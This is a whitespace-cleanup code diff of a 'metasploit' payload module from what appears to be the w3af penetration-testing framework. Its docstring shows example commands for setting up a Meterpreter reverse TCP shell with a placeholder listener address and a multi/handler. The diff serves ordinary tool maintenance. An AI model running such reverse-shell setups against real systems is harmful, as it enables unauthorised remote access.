@@ -6,15 +6,15 @@ from core.controllers.exceptions import w3afException
 class metasploit(base_payload):
     '''
     This payload interacts with the metasploit framework.
-    
+
     Usage:
     You need to specify the payload type in MSF format as if you were calling msfpayload:
         linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4
-    
+
     And then add a pipe ("|") to add the msfcli parameters for handling the
     incoming connection (in the case of a reverse shell) or connect to the
     remote server.
-    
+
     A complete example looks like this:
         linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 | exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 E
     '''
@@ -24,10 +24,9 @@ class metasploit(base_payload):
         except w3afException, w3:
             return 'Error, %s' % w3
         else:
-            vd.run( msf_args )
+            vd.run(msf_args)
             return 'Successfully started the virtual daemon.'
-    
+
     def run_execute(self, msf_args):
         api_result = self.api_execute(msf_args)
         return api_result
-
